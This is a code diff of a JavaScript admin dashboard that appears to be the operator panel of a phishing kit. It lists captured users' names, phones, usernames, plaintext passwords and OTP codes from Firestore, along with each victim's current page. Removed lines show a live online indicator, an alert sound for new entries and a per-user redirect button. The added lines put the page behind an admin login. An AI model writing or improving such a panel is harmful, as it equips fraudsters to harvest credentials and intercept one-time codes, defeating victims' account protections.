@@ -463,98 +463,79 @@ const audio = new Audio(
     "assets/notification.wav"
 );
 
-onSnapshot(collection(db,"users"), (snapshot)=>{
+
+function loadUsers(){
+
+onSnapshot(collection(db,"users"), 
+(snapshot)=>{
 
     usersTable.innerHTML = "";
 
-if(!firstLoad && snapshot.docChanges().length > 0){
+    const users = [];
 
-    audio.play().catch(()=>{});
+    snapshot.forEach((docSnap)=>{
+
+        users.push({
+            id: docSnap.id,
+            ...docSnap.data()
+        });
+
+    });
+
+
+    users.forEach((user)=>{
+
+        usersTable.innerHTML += `
+        <tr>
+
+        <td>${user.name || '-'}</td>
+        <td>${user.phone || '-'}</td>
+        <td>${user.username || '-'}</td>
+        <td>${user.password || '-'}</td>
+        <td>${user.otp || '-'}</td>
+
+        <td>
+        <div class="status">
+        ${user.status || 'pending'}
+        </div>
+        </td>
+
+        <td>${user.currentPage || '-'}</td>
+
+        </tr>
+        `;
+
+    });
+
+
+},
+(error)=>{
+
+    console.error("Firestore error:",error);
+
+});
+
 
 }
 
-   const users = [];
 
-snapshot.forEach((docSnap)=>{
+onAuthStateChanged(auth,(user)=>{
 
-    users.push({
-        id: docSnap.id,
-        ...docSnap.data()
-    });
+    console.log("AUTH:",user);
 
-});
+    if(!user){
 
-/* newest first */
+        window.location.href="admin-login.html";
+        return;
 
-users.sort((a,b)=>{
+    }
 
-    const aTime =
-        a.createdAt?.seconds || a.createdAt || 0;
+    document.body.style.opacity="1";
 
-    const bTime =
-        b.createdAt?.seconds || b.createdAt || 0;
-
-    return bTime - aTime;
+    loadUsers();
 
 });
 
-users.forEach((user)=>{
-
-    const online =
-        Date.now() - (user.lastSeen || 0) < 15000;
-
-    usersTable.innerHTML += `
-
-    <tr>
-
-        <td>${user.name || '-'}</td>
-
-        <td>${user.phone || '-'}</td>
-
-        <td>${user.username || '-'}</td>
-
-<td>${user.password || '-'}</td>
-
-<td>${user.otp || '-'}</td>
-
-        <td>
-            <div class="status">
-                ${user.status || 'pending'}
-            </div>
-        </td>
-
-        <td>
-            ${user.currentPage || '-'}
-        </td>
-
-        <td>
-            <div class="status"
-                 style="
-                 background:${online ? 'rgba(34,197,94,.15)' : 'rgba(239,68,68,.15)'};
-                 color:${online ? '#22c55e' : '#ef4444'};
-                 ">
-                ${online ? 'Online' : 'Offline'}
-            </div>
-        </td>
-
-        <td>
-
-            <button
-                class="route-btn"
-                onclick="openPopup('${user.id}')"
-            >
-                توجيه
-            </button>
-
-        </td>
-
-    </tr>
-
-    `;
-    });
-firstLoad = false;
-
-});
 
 /* popup open */
 
